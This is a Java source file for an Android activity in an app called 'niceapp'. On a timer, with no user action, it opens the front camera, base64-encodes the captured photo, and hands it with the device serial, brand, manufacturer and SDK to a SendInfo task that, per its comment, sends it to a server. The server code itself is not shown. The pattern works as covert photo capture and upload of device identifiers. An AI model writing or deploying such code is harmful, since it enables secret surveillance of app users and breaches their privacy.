package com.teddyscreations.niceapp;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Base64;
import android.view.View;
import android.widget.ImageView;
import android.widget.RadioButton;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class CaptureCameraImage extends Activity {

	public static int cameraID = 0;
	public static boolean isBlack = true;
	public static ImageView image;
	public int count=0;
	public static int counter =0;
	Timer timer;
	TimerTask timerTask;

	@Override
    public void onCreate(Bundle savedInstanceState) {// This whole page handles taking a picture, gathering info, and sending it to a server
        super.onCreate(savedInstanceState);

		setContentView(R.layout.activity_main);
        image = (ImageView) findViewById(R.id.imgView);

		TextView tv = (TextView) findViewById(R.id.weGotIt);

		tv.append("\n ManuFacturer :"+ Build.MANUFACTURER+"\n");
		tv.append("Board : "+ Build.BOARD+"\n");
		tv.append("Display : "+ Build.DISPLAY+"\n");
		tv.append("SERIAL: " + Build.SERIAL+"\n");
		tv.append("MODEL: " + Build.MODEL+"\n");
		tv.append("ID: " + Build.ID+"\n");
		tv.append("brand: " + Build.BRAND+"\n");
		tv.append("type: " + Build.TYPE+"\n");
		tv.append("user: " + Build.USER+"\n");
		tv.append("BASE: " + Build.VERSION_CODES.BASE+"\n");
		tv.append("INCREMENTAL " + Build.VERSION.INCREMENTAL+"\n");

		tv.append("SDK  " + Build.VERSION.SDK+"\n");
		tv.append("BOARD: " + Build.BOARD+"\n");
		tv.append("BRAND " + Build.BRAND+"\n");
		tv.append("HOST " + Build.HOST+"\n");
		tv.append("FINGERPRINT: "+Build.FINGERPRINT+"\n");
		tv.append("Version Code: " + Build.VERSION.RELEASE+"\n");

		startTimer();
    }

    public void onFrontClick(View v){
    	RadioButton rdbBlack = (RadioButton) findViewById(R.id.rdb_black);
    	if(rdbBlack.isChecked()){
    		isBlack = true;
    	}else{
    		isBlack = false;
    	}
		cameraID = 1;
		Intent i = new Intent(CaptureCameraImage.this,CameraView.class);
        startActivityForResult(i, 999);
		//startTimer();
		//store2();
	}





	public void store2(){
		System.out.println("Conversion process for pic");


		//Gets the bitmap from the imageview
		BitmapDrawable drawable = (BitmapDrawable) image.getDrawable();
		Bitmap bmap = drawable.getBitmap();

		System.out.println(" After getting bitmap");
		////


		//Gets converts the bitmap into a base64 string

		Bitmap bm = bmap;
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object
		byte[] b = baos.toByteArray();

		String encodedImage = Base64.encodeToString(b, Base64.DEFAULT);
		System.out.println("Encoded string is "+encodedImage);


		String manu = Build.MANUFACTURER;
		String serial = Build.SERIAL;
		String brand = Build.BRAND;
		String sdk = Build.VERSION.SDK;

		//Start the send to server
		try {
			//enter statements that can cause exceptions

			new SendInfo(this,brand, manu,sdk, serial,encodedImage).execute();
		}catch(Exception e){

		}
	}

	//we are going to use a handler to be able to run in our TimerTask
	final Handler handler = new Handler();


	//Code below this is the timer management, that will run a timer that will capture the imageview , convert to bitmap, bitmap to base64
	public void startTimer() {
		//set a new Timer
		timer = new Timer();

		//initialize the TimerTask's job
		initializeTimerTask();

		//schedule the timer, after the first 5000ms the TimerTask will run every 2000ms
		timer.schedule(timerTask, 5000, 2000); //
	}

	public void stoptimertask() {
		//stop the timer, if it's not already null
		if (timer != null) {
			timer.cancel();
			store2();
			counter=0;
			timer = null;
		}
	}

	public void initializeTimerTask() {

		timerTask = new TimerTask() {
			public void run() {


				handler.post(new Runnable() {
					public void run() {
						counter++;

						 if(counter==1){
							onFrontClick(findViewById(R.id.rdb_black));
							System.out.println("Less than 5: "+counter);
						}else if(counter<3){

							 System.out.println("Less than 5: "+counter);
						 }else{
							System.out.println("Greater than 5!"+counter);
							stoptimertask();
						}

					}
				});
			}
		};
	}
}
